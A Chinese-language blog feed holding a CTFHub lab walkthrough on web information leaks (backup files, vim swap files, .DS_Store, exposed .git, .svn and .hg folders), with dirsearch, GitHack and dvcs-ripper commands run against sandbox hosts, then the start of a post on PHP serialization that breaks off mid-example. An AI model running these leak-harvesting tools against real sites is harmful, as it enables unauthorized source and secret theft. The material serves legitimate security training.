    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（一）</p> <a id="more"></a><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>访问网址，点击绿色按钮<br><img src="https://img-blog.csdnimg.cn/20201025170908376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后出现这样的页面<br><img src="https://img-blog.csdnimg.cn/20201025170931536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点进去发现都有四个子文件，既然题目是目录遍历，那我就一个个点进去看，最后在4/4目录下发现了flag.txt<br><img src="https://img-blog.csdnimg.cn/20201025171354476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开获得flag<br><img src="https://img-blog.csdnimg.cn/20201025171411952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>访问网址，点击绿色按钮<br><img src="https://img-blog.csdnimg.cn/20201024125404176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现是phpinfo.php<img src="https://img-blog.csdnimg.cn/20201024125428811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>按ctrl+F搜索flag<br><img src="https://img-blog.csdnimg.cn/20201024125524903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>访问网址<br><img src="https://img-blog.csdnimg.cn/20201025171840554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用 dirsearch扫描，发现了可疑文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">py dirsearch.py -u http://challenge-4f306ca5f548ac6b.sandbox.ctfhub.com:<span class="hljs-number">10080</span>/ -e*<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201025172527172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问该文件，自动下载了一个压缩包，解压看到flag文档，结果。。。。。。<br><img src="https://img-blog.csdnimg.cn/20201025172829492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接在浏览器上访问flag文档<br><img src="https://img-blog.csdnimg.cn/20201025173027426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p><img src="https://img-blog.csdnimg.cn/20201025173722285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一般备份文件的格式后缀为<code>.bak</code>，因此访问<code>url+/index.php.bak</code>，会自动下载一个文件，打开该文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201025173839200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> <em>常见备份文件的后缀</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">.rar<br>.<span class="hljs-built_in">zip</span><br><span class="hljs-number">.7</span>z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html<br>linux中可能以<span class="hljs-string">&quot; ~ &quot;</span> 结尾<br></code></pre></td></tr></table></figure><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>题目描述：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br><img src="https://img-blog.csdnimg.cn/20201025175348418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度了解一下什么是 <code>vim缓存</code></p><blockquote><p>vim在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生swo等.<br>网页后面输入.index.php.swp才能获取到index.php的备份文件</p></blockquote><p>访问<code>url/+.index.php.swp</code>下载文件，用记事本打开，在文档底部找到flag<br><img src="https://img-blog.csdnimg.cn/20201025175508624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>题目描述：<br>DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20201118202642955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接访问<code>.DS_Store</code>文件，自动下载文件，在kali中使用命令<code>cat DS_Store</code><br><img src="https://img-blog.csdnimg.cn/20201118203036832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问d18ec35f05a6922cc5c842f7b6706243.txt文件<br><img src="https://img-blog.csdnimg.cn/20201118203317871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p><strong>安装 Git</strong></p><p>1 .点击Git-2.18.0-32-bit.exe进行安装，选择安装路径。<br><img src="https://img-blog.csdnimg.cn/20201024183656934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3doYXQ=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>2 . 点击“Next”按钮<br><img src="https://img-blog.csdnimg.cn/20201024183722145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3 .Next，在启动文件夹页面中，默认即可。<br><img src="https://img-blog.csdnimg.cn/20201024183744151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4 .Next，在为 Git 选择默认编辑器的页面中，可以选择一个在 Windows系统中使用较为方便的编辑器。</p><p>5 .Next，在将 Git 添加到环境变量的页面中，选择第二项。可以将 Git 自动添加到环境变量，可以方便地使用 Windows 控制台执行 Git 相关的命令。<br><img src="https://img-blog.csdnimg.cn/20201024183816454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6 .后面的页面一路next，就可以完成 Git的安装。</p><p><strong>初始化 Git</strong></p><blockquote><p>注意：在配置 Git 用户名和邮箱时，推荐使用在 CodeCode 注册的用户名和邮箱。</p></blockquote><p>1  . 在 Git 中配置 CodeCode 用户名。<br>打开cmd，输入命令。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git config --global user.name <span class="hljs-string">&#x27;xxx&#x27;</span><br></code></pre></td></tr></table></figure><p>2 . 在 Git 中配置邮箱。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git config --global user.email <span class="hljs-string">&#x27;xxx@qq.com&#x27;</span><br></code></pre></td></tr></table></figure><p>3 . 查看已配置的用户信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">git config --<span class="hljs-keyword">global</span> --<span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p> 使用githack工具处理git泄露情况，打开cmd窗口，进入githack目录下，然后执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python2 Githack.py http:<span class="hljs-comment">//challenge-097036b10ed011a0.sandbox.ctfhub.com:10080/.git/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024204243631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还原后的文件在 <code>dist</code> 目录下<br><img src="https://img-blog.csdnimg.cn/20201024204611326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>应该有隐藏文件夹，鼠标右键打开git命令窗口，执行<code>ls  -a</code>，发现了隐藏文件夹<code>.git</code><br><img src="https://img-blog.csdnimg.cn/20201024204803631.png#pic_center" alt="在这里插入图片描述"><br>然后<code> cd .git</code>进入.git目录,再执行<code>ls -a</code>，发现了<code>..文件</code><br><img src="https://img-blog.csdnimg.cn/2020102420502298.png#pic_center" alt="在这里插入图片描述"><br>执行<code>cd ..</code>，然后使用<code>git log</code>命令查看历史记录。最新版本 为remove flag，flag 在 add flag中<br> <img src="https://img-blog.csdnimg.cn/20201024205433523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进行比对，得到flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git diff <span class="hljs-number">602e0165129</span>c86054756c8a1b188265377b1d334<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024205703823.png#pic_center" alt="在这里插入图片描述"></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><p>打开cmd窗口，进入githack目录下，然后执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python2 GitHack.py http:<span class="hljs-comment">//challenge-5dbefbea477f1e4f.sandbox.ctfhub.com:10080/.git/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024234829723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入生成的文件夹路径后，输入： <code>git stash list</code><br><img src="https://img-blog.csdnimg.cn/2020102423493374.png#pic_center" alt="在这里插入图片描述"><br>输入 <code>git stash apply</code> 进行恢复，发现了一个文档<br><img src="https://img-blog.csdnimg.cn/20201024235041194.png#pic_center" alt="在这里插入图片描述"><br>在路径下找到文档，得到flag<br><img src="https://img-blog.csdnimg.cn/20201024235153602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>方法一：<br>和前面两题一样的操作，进入githack目录下，然后执行<code>python2 GitHack.py http://challengefbe1da739791a37e.sandbox.ctfhub.com:10080/.git/</code><br><img src="https://img-blog.csdnimg.cn/20201025122844915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>cd到生成的文件夹目录下，执行<code>git ls-files</code>命令，可以看到一个文档<br><img src="https://img-blog.csdnimg.cn/20201025122827978.png#pic_center" alt="在这里插入图片描述"><br>flag就在文档中<br><img src="https://img-blog.csdnimg.cn/20201025123137677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>kali中使用GitHacker，执行命令安装GitHacker</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">clone git clone https:<span class="hljs-comment">//github.com/WangYihang/GitHacker</span><br></code></pre></td></tr></table></figure><p>进入GitHacker目录下，执行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python3 GitHacker.py http:<span class="hljs-comment">//challenge-78aecaffb772da05.sandbox.ctfhub.com:10080/.git</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024231829893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再GitHacker目录下会生成两个个文件夹，打开<br><img src="https://img-blog.csdnimg.cn/20201024232158129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>flag就在记事本中<br><img src="https://img-blog.csdnimg.cn/20201024232234408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p>题目描述：当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。<br><img src="https://img-blog.csdnimg.cn/2020111820454290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>需要用到<code>dvcs-ripper</code>这个工具</p><p>安装dvcs-ripper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">git clone https://github.com/kost/dvcs-ripper.git<br></code></pre></td></tr></table></figure><p>安装依赖包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl<br></code></pre></td></tr></table></figure><p>安装失败，先执行下面的命令，再重新执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span>  <br></code></pre></td></tr></table></figure><p>dvcs-ripper工具用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./rip-git.pl -v -u http://challenge-bd3813f36ed0e21c.sandbox.ctfhub.com:<span class="hljs-number">10080</span>/.svn/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175105515.png" alt="在这里插入图片描述"><br>查看目录结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ls <span class="hljs-operator">-</span>al<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175222664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.svn/pristine/目录，查看文件信息，看到可疑文件84<br><img src="https://img-blog.csdnimg.cn/20210127175318256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入84文件，查看文件里面的内容即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210127175403327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>题目描述:当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><p>使用<code>dvcs-ripper</code>工具</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">.<span class="hljs-operator">/</span>rip<span class="hljs-operator">-</span>hg.pl <span class="hljs-operator">-</span>v <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>challenge<span class="hljs-number">-05407</span>d8a0c1ffb04.sandbox.ctfhub.com:<span class="hljs-number">10080</span><span class="hljs-operator">/</span>.hg<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175822781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.hg/store/目录，查看文件信息<br><img src="https://img-blog.csdnimg.cn/20210127180159395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看fncache文件信息<br><img src="https://img-blog.csdnimg.cn/20210127180229796.png" alt="在这里插入图片描述"><br>未看到flag_1711932515.txt信息<br><img src="https://img-blog.csdnimg.cn/20210127180244399.png" alt="在这里插入图片描述"><br>直接浏览器访问flag_1711932515.txt，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210127180402891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（一）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="http://atkx.top/tags/CTFhub/"/>
    
    <category term="信息泄露" scheme="http://atkx.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>浅谈PHP反序列化漏洞</title>
    <link href="http://atkx.top/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://atkx.top/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-10-18T07:44:31.000Z</published>
    <updated>2021-02-05T05:30:15.037Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：PHP反序列化</p> <a id="more"></a><h2 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h2><blockquote><p>序列化是将变量转换为可保存或传输的字符串的过程。</p></blockquote><p>函数  <code>serialize()</code>，可将变量转换为字符串并且在转换中保存当前变量的值。<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。php允许保存一个对象方便以后重用，这个过程被称为序列化。<br>我们先建一个Test对象，存入信息，然后直接输出对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br>    print_r(<span class="hljs-variable">$m</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Test <span class="hljs-keyword">Object</span><br>(<br>    [id] =&gt; <span class="hljs-number">1</span><br>    [name] =&gt; admin<br>    [password] =&gt; admins<br>)<br></code></pre></td></tr></table></figure><p>先new一个实例$m，再用<code>serialize()</code>函数将这个对象进行序列化成字符串，然后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"> </span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br> &#125;<br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$m</span>-&gt;id=<span class="hljs-number">2</span>;<br><span class="hljs-variable">$m</span>-&gt;name=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$m</span>-&gt;password=<span class="hljs-string">&quot;roots&quot;</span>;<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$m</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>序列化后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;root&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;roots&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>分析一下输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205041836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>黑色箭头，字母O代表Object对象；如果是A，则代表Array数组。<br>黄色箭头，数字4，代表对象名称Test占4个字符。<br>橙色箭头，数字3，代表对象里面有3个变量。<br>红色箭头，字母s代表string类型，i代表int类型。<br>紫色箭头，数字2，代表变量名占2个字符。</p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><blockquote><p>反序列化是在适当的时候把这个字符串再转化成原来的变量使用。</p></blockquote><p>函数<code>unserialize</code> ，把serialize序列化后的字符串变成一个对象。可以从已存储的表示中创建PHP的值。恢复原先被序列化的变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"> </span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span 